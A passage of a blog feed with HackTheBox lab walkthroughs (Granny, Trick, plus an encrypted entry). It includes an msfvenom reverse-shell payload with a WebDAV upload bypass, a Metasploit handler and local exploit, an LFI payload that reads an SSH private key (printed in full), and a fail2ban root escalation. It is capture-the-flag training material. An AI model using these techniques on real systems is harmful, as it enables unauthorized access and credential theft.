Date: Mon, 11 Sep 2023 13:12:46 GMT</span><br><span class="line">|   Server Type: Microsoft-IIS/6.0</span><br><span class="line">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK</span><br><span class="line">|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 19.33 seconds</span><br></pre></td></tr></table></figure><p>With nmap scan result we found that the webdav service is enabled.<br>To conifrm the webdav service we used davtest.<br><code>davtest -url http://10.10.10.15</code><br><strong>Reference:</strong></p><ul><li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav</a></li></ul><h2 id="User-Shell"><a href="#User-Shell" class="headerlink" title="User Shell"></a>User Shell</h2><p>As we know that webdav allows file uploads in webserver so we are going to upload the aspx meterpreter rev shell.<br><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.9 lport=1111 -f aspx -o shell.aspx</code><br>To upload file we used cadaver</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ cadaver 10.10.10.15:80</span><br><span class="line">dav:/&gt; put shell.aspx </span><br><span class="line">Uploading shell.aspx to `/shell.aspx<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">Progress: [=============================&gt;] 100.0% of 2851 bytes failed:</span></span><br><span class="line"><span class="string">403 Forbidden.</span></span><br><span class="line"><span class="string">dav:/&gt; put shell.txt </span></span><br><span class="line"><span class="string">Uploading shell.txt to `/shell.txt&#x27;</span>:</span><br><span class="line">Progress: [=============================&gt;] 100.0% of 2851 bytes succeeded.</span><br><span class="line">dav:/&gt; copy shell.txt shell.aspx</span><br><span class="line">Copying `/shell.txt<span class="string">&#x27; to `/shell.aspx&#x27;</span>:  succeeded.</span><br></pre></td></tr></table></figure><p>but it restrict the file extensions like aspx and asp so we renamed the shell.aspx to shell.txt upload it into the server then change the file extension to original using <strong>copy</strong> command.<br><strong>Now set up the payload handler</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ ./msfconsole -q</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">lhost =&gt; 192.168.1.123</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> lport 1111</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf exploit(handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse handler on 10.10.14.x:1111</span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure><p>To trigger reverse shell open the link <a href="http://10.10.10.15/shell.aspx">http://10.10.10.15/shell.aspx</a><br>we got meterpreter shell.</p><h2 id="Root-Shell"><a href="#Root-Shell" class="headerlink" title="Root Shell"></a>Root Shell</h2><p>As it is a windows machine i directly run the exploit suggester in metasploit<br><code>post/multi/recon/local_exploit_suggester</code></p><p>It  suggested like 8+ exploits so i decided to run one by one.<br>first try we got the root shell using this exploit<br><code>use windows/local/ms14_058_track_popup_menu</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;<span class="built_in">type</span> <span class="string">&quot;C:\Documents and Settings\Lakis\Desktop\user.txt&quot;</span></span><br><span class="line">xxxxxx...</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">type</span> <span class="string">&quot;C:\Documents and Settings\Administrator\Desktop\root.txt&quot;</span></span><br><span class="line">xxxxxx...</span><br></pre></td></tr></table></figure><p>We got the user and root flag</p>]]></content>
    
    
    <summary type="html">HackTheBox&#39;s Granny is an easy level windows machine.</summary>
    
    
    
    <category term="HackTheBox" scheme="https://mdn1nj4.github.io/categories/HackTheBox/"/>
    
    
    <category term="windows" scheme="https://mdn1nj4.github.io/tags/windows/"/>
    
    <category term="webdav" scheme="https://mdn1nj4.github.io/tags/webdav/"/>
    
    <category term="metasploit" scheme="https://mdn1nj4.github.io/tags/metasploit/"/>
    
    <category term="iis" scheme="https://mdn1nj4.github.io/tags/iis/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox - Neonify Writeup</title>
    <link href="https://mdn1nj4.github.io/htb/hackthebox-neonify-writeup/"/>
    <id>https://mdn1nj4.github.io/htb/hackthebox-neonify-writeup/</id>
    <published>2022-12-13T13:00:00.000Z</published>
    <updated>2025-05-08T07:35:21.383Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c0b95768a434974f3208a870680a0f30f0799059e3cb9ef17b162a95fc1e8924"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Submit the flag here</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">It&#39;s time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!</summary>
    
    
    
    <category term="HackTheBox" scheme="https://mdn1nj4.github.io/categories/HackTheBox/"/>
    
    
    <category term="ssti" scheme="https://mdn1nj4.github.io/tags/ssti/"/>
    
    <category term="regex" scheme="https://mdn1nj4.github.io/tags/regex/"/>
    
    <category term="ruby" scheme="https://mdn1nj4.github.io/tags/ruby/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox - Trick Walkthrough</title>
    <link href="https://mdn1nj4.github.io/htb/hackthebox-trick-writeup/"/>
    <id>https://mdn1nj4.github.io/htb/hackthebox-trick-writeup/</id>
    <published>2022-09-05T13:00:00.000Z</published>
    <updated>2025-05-08T07:31:28.267Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote><p><strong>OS</strong>: Linux<br><strong>Difficulty</strong>: Easy<br><strong>Points</strong>: 20<br><strong>Release</strong>: 18 Jun 2022<br><strong>IP</strong>: 10.10.11.166</p></blockquote><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="nmap-scanning-result"><a href="#nmap-scanning-result" class="headerlink" title="nmap scanning result"></a>nmap scanning result</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.92 scan initiated Sat Jul  9 05:53:58 2022 as: nmap -sC -sV -oN scan.nmap -vvv 10.10.11.166</span></span><br><span class="line">Increasing send delay <span class="keyword">for</span> 10.10.11.166 from 0 to 5 due to 124 out of 413 dropped probes since last increase.</span><br><span class="line">Increasing send delay <span class="keyword">for</span> 10.10.11.166 from 5 to 10 due to 11 out of 28 dropped probes since last increase.</span><br><span class="line">Increasing send delay <span class="keyword">for</span> 10.10.11.166 from 10 to 20 due to 11 out of 15 dropped probes since last increase.</span><br><span class="line">Increasing send delay <span class="keyword">for</span> 10.10.11.166 from 20 to 40 due to 11 out of 15 dropped probes since last increase.</span><br><span class="line">Increasing send delay <span class="keyword">for</span> 10.10.11.166 from 40 to 80 due to 11 out of 19 dropped probes since last increase.</span><br><span class="line">Increasing send delay <span class="keyword">for</span> 10.10.11.166 from 80 to 160 due to 11 out of 14 dropped probes since last increase.</span><br><span class="line">Increasing send delay <span class="keyword">for</span> 10.10.11.166 from 160 to 320 due to 11 out of 12 dropped probes since last increase.</span><br><span class="line">Increasing send delay <span class="keyword">for</span> 10.10.11.166 from 320 to 640 due to 11 out of 12 dropped probes since last increase.</span><br><span class="line">Increasing send delay <span class="keyword">for</span> 10.10.11.166 from 640 to 1000 due to 11 out of 12 dropped probes since last increase.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.166</span><br><span class="line">Host is up, received echo-reply ttl 63 (0.37s latency).</span><br><span class="line">Scanned at 2022-07-09 05:53:59 UTC <span class="keyword">for</span> 579s</span><br><span class="line">Not shown: 996 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5Rh57OmAndXFukHce0Tr4BL8CWC8yACwWdu8VZcBPGuMUH8VkvzqseeC8MYxt5SPL1aJmAsZSgOUreAJNlYNBBKjMoFwyDdArWhqDThlgBf6aqwqMRo3XWIcbQOBkrisgqcPnRKlwh+vqArsj5OAZaUq8zs7Q3elE6HrDnj779JHCc5eba+DR+Cqk1u4JxfC6mGsaNMAXoaRKsAYlwf4Yjhonl6A6MkWszz7t9q5r2bImuYAC0cvgiHJdgLcr0WJh+lV8YIkPyya1vJFp1gN4Pg7I6CmMaiWSMgSem5aVlKmrLMX10MWhewnyuH2ekMFXUKJ8wv4DgifiAIvd6AGR</span><br><span class="line">|   256 9e:<span class="built_in">cd</span>:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoXvyMKuWhQvWx52EFXK9ytX/pGmjZptG8Kb+DOgKcGeBgGPKX3ZpryuGR44av0WnKP0gnRLWk7UCbqY3mxXU0=</span><br><span class="line">|   256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGY1WZWn9xuvXhfxFFm82J9eRGNYJ9NnfzECUm0faUXm</span><br><span class="line">25/tcp open  smtp    syn-ack ttl 63 Postfix smtpd</span><br><span class="line">|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING</span><br><span class="line">53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 nginx 1.14.2</span><br><span class="line">|_http-title: Coming Soon - Start Bootstrap Theme</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sat Jul  9 06:03:38 2022 -- 1 IP address (1 host up) scanned in 579.81 seconds</span></span><br></pre></td></tr></table></figure><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>Found the subdomains using DNS query</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dig axfr @10.10.11.166 trick.htb</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.16.27-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166 trick.htb</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br><span class="line">trick.htb.              604800  IN      NS      trick.htb.</span><br><span class="line">trick.htb.              604800  IN      A       127.0.0.1</span><br><span class="line">trick.htb.              604800  IN      AAAA    ::1</span><br><span class="line">preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.</span><br><span class="line">trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br><span class="line">;; Query time: 400 msec</span><br><span class="line">;; SERVER: 10.10.11.166<span class="comment">#53(10.10.11.166)</span></span><br><span class="line">;; WHEN: Sat Jul 09 06:05:43 UTC 2022</span><br><span class="line">;; XFR size: 6 records (messages 1, bytes 231)</span><br></pre></td></tr></table></figure><p>Found 2 subdomains</p><ul><li>root.trick.htb</li><li>preprod-payroll.trick.htb</li></ul><p>Open the preprod-payroll.trick.htb in the browser</p><p><img src="https://i.imgur.com/BGQCJVA.png">found the “Employee’s Payroll Management System” admin page.</p><p>After some googling i found this! : <a href="https://www.exploit-db.com/exploits/50403">https://www.exploit-db.com/exploits/50403</a></p><p>Able to find administrator creds using this sql injection.</p><p>Tried multiple methods to get user but nothing works.</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><p>Continued the enumeration, then found other subdomain: preprod-marketing.trick.htb</p><p>The LFI was discovered in the application.</p><p>Using this payload : <a href="http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id">http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id</a> rsa</p><p>Able to view the michael openssh private key</p><p>Save the openssh private key into the file.</p><figure class="highlight plaintext"><figcaption><span>key</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz</span><br><span class="line">c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G</span><br><span class="line">YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+</span><br><span class="line">4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/</span><br><span class="line">Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4</span><br><span class="line">1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC</span><br><span class="line">DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0</span><br><span class="line">+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE</span><br><span class="line">hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L</span><br><span class="line">jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6</span><br><span class="line">IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C</span><br><span class="line">aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/</span><br><span class="line">KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC</span><br><span class="line">tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge</span><br><span class="line">U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0</span><br><span class="line">fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V</span><br><span class="line">PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS</span><br><span class="line">3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA</span><br><span class="line">fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT</span><br><span class="line">AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn</span><br><span class="line">In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP</span><br><span class="line">JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN</span><br><span class="line">jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+</span><br><span class="line">IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>Change the permission for key file.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 600 micheal.key</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh -i micheal.key michael@10.10.11.166</span><br><span class="line">Linux trick 4.19.0-20-amd64 <span class="comment">#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Tue Sep  6 20:37:26 2022 from 10.10.14.49</span><br><span class="line">-bash-5.0$ <span class="built_in">cat</span> user.txt </span><br><span class="line">11c5d4f9e8f3010b5f347312fffxxxxx</span><br><span class="line">-bash-5.0$ </span><br></pre></td></tr></table></figure><p>Got User Flag.</p><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>User michael has permission to restart the fail2ban service</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0$ sudo -l </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> michael on trick:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User michael may run the following commands on trick:</span><br><span class="line">    (root) NOPASSWD: /etc/init.d/fail2ban restart</span><br><span class="line">bash-5.0$ </span><br></pre></td></tr></table></figure><p>Using this service we can escalate to the root user.</p><p>Reference: <a href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7">Abusing Fail2ban misconfiguration to escalate privileges on Linux</a></p><p>‘security’ group user can able to modify &#x2F;etc&#x2F;fail2ban&#x2F;action.d&#x2F; folder.</p><p>but we cannot able to change existing file content.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0$ <span class="built_in">ls</span> -l /etc/fail2ban/</span><br><span class="line">total 60</span><br><span class="line">drwxrwx--- 2 root security  4096 Sep  6 20:46 action.d</span><br><span class="line">-rw-r--r-- 1 root root      2334 Sep  6 20:45 fail2ban.conf</span><br><span class="line">drwxr-xr-x 2 root root      4096 Sep  6 20:45 fail2ban.d</span><br><span class="line">drwxr-xr-x 3 root root      4096 Sep  6 20:45 filter.d</span><br><span class="line">-rw-r--r-- 1 root root     22908 Sep  6 20:45 jail.conf</span><br><span class="line">drwxr-xr-x 2 root root      4096 Sep  6 20:45 jail.d</span><br><span class="line">-rw-r--r-- 1 root root       645 Sep  6 20:45 paths-arch.conf</span><br><span class="line">-rw-r--r-- 1 root root      2827 Sep  6 20:45 paths-common.conf</span><br><span class="line">-rw-r--r-- 1 root root       573 Sep  6 20:45 paths-debian.conf</span><br><span class="line">-rw-r--r-- 1 root root       738 Sep  6 20:45 paths-opensuse.conf</span><br><span class="line">bash-5.0$ <span class="built_in">id</span></span><br><span class="line">uid=1001(michael) gid=1001(michael) <span class="built_in">groups</span>=1001(michael),1002(security)</span><br></pre></td></tr></table></figure><p>Copy the existing config &#x2F;etc&#x2F;fail2ban&#x2F;action.d&#x2F;iptables-multiport.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak</span><br></pre></td></tr></table></figure><p>As stated in the reference blog, modify the backup configuration.</p><p>Then delete the existing config</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> /etc/fail2ban/action.d/iptables-multiport.conf</span><br></pre></td></tr></table></figure><p>Rename the backup config</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> /etc/fail2ban/action.d/iptables-multiport.conf.bak /etc/fail2ban/action.d/iptables-multiport.conf</span><br></pre></td></tr></table></figure><p>Restart the fail2ban service.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0$ sudo /etc/init.d/fail2ban restart</span><br><span class="line">[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.</span><br><span class="line">bash-5.0$ <span class="built_in">cd</span> /etc/fail2ban/action.d/</span><br></pre></td></tr></table></figure><p>try some invalid passwords in SSH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.10.11.166</span><br><span class="line">root@trick.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">root@trick.htb&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">root@trick.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">root@trick.htb: Permission denied (publickey,password).</span></span><br></pre></td></tr></table></figure><p>After 3 attempt our payload executed in the machine as root.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0<span class="comment"># id</span></span><br><span class="line">uid=1001(michael) gid=1001(michael) euid=0(root) <span class="built_in">groups</span>=1001(michael),1002(security)</span><br><span class="line">bash-5.0<span class="comment"># cd /root/</span></span><br><span class="line">bash-5.0<span class="comment"># cat root.txt</span></span><br><span class="line">228c38a63500d91464833478d2xxxxxx</span><br><span class="line">bash-5.0<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>copy and submit the root flag.</p>]]></content>
    
    
    <summary type="html">Trick was an easy box from hackthebox.</summary>
    
    
    
    <category term="HackTheBox" scheme="https://mdn1nj4.github.io/categories/HackTheBox/"/>
    
    
    <category term="rce" scheme="https://mdn1nj4.github.io/tags/rce/"/>
    
    <category term="htb" scheme="https://mdn1nj4.github.io/tags/htb/"/>
    
    <category term="cve" scheme="https://mdn1nj4.github.io/tags/cve/"/>
    
    <category term="fail2ban" scheme="https://mdn1nj4.github.io/tags/fail2ban/"/>
    
    <category term="sql" scheme="https://mdn1nj4.github.io/tags/sql/"/>
    
    <category term="lfi" scheme="https://mdn1nj4.github.io/tags/lfi/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox - Late Walkthrough</title>
    <link href="https://mdn1nj4.github.io/htb/hackthebox-late-writeup/"/>
    <id>https://mdn1nj4.github.io/htb/hackthebox-late-writeup/</id>
    <published>2022-04-11T13:00:00.000Z</published>
    <updated>2025-05-08T07:31:28.252Z</updated>
    
